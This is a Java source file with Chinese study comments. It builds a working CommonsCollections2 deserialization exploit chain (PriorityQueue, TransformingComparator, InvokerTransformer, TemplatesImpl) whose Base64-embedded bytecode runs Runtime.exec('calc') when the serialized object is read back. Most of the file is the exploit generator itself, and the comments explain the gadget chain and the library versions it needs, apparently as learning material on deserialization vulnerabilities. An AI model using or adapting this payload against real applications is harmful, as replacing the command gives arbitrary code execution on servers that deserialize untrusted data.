package CC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CommonsCollections2 {

    /**
     * 利用条件比较苛刻：首先 CommonsCollections3 中无法使用，因为其 TransformingComparator 无法序列化。其次只有 CommonsCollections4-4.0 可以使用，
     * 因为 CommonsCollections4 其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化
     * Apache common3.readObject方法增加了check校验
     * Apache Common4.2及以上场景中InvokerTransformer禁止了writeObject和readObject
     *
     * ->PriorityQueue.readObject()
     *       ->PriorityQueue.heapify()
     *           ->PriorityQueue.siftDown()
     *             ->PriorityQueue.siftDownUsingComparator()
     *                 ->TransformingComparator.compare()
     *                     ->InvokerTransformer.transform()
     *                         ->TemplatesImpl.newTransformer()
     *                         ->…………
     * Q：为什么要用readObject函数？
     * A：因为需要sitedown函数中使用到了比较器，heaify函数中又调用了sitedown函数，而readObject函数又调用了heapify函数
     * Q：为什么需要比较器？
     * A：因为可以在比较器中传入invoketransformer
     * A：0420更新：需要比较器并不是因为需要传入invoketransformer，是因为需要使用priorityQueue反序列化执行任意命令，有两个条件1、一个是传入的对象需要实现readObejct2、而是实现comparator接口
     *
     * templatesImpl利用
     * 加载对象需要是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的实现类
     * 需要设置_name,_bytecodes
     * _tfactory属性在高版本需要设置，jdk7u21中不是必须，看jdk版本而言-》defineTransletClasses
     *
     * @param args
     */
    public static void main(String[] args) {

        try{
            //字节码
            byte[] code = Base64.getDecoder().decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //为了执行 templates.newTransformer
            InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

            //TransformingComparator 实例，参数需要个transform对象
            //将一个Comparator对象转换为另一个Comparator对象
            TransformingComparator comparator = new TransformingComparator(invokerTransformer);

            //PriorityQueue 实例，java队列
            PriorityQueue priorityQueue = new PriorityQueue(2);
            //先设置为正常变量值，后面可以通过setFieldValue修改
            priorityQueue.add(1);
            priorityQueue.add(1);

            //反射设置 Field
            //将templates放入到队列中去了
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);

            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}